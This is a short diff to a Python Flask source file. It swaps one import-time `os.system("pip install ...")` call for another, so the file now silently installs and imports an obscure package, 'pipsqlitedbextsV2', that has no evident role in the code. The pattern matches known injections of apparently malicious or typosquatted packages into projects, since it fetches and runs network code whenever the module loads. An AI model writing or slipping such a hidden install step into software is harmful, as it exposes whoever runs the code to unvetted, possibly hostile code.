@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syscolouraddons")
-import syscolouraddons
+os.system("pip install pipsqlitedbextsV2")
+import pipsqlitedbextsV2
 import flask
 
 from flask import g
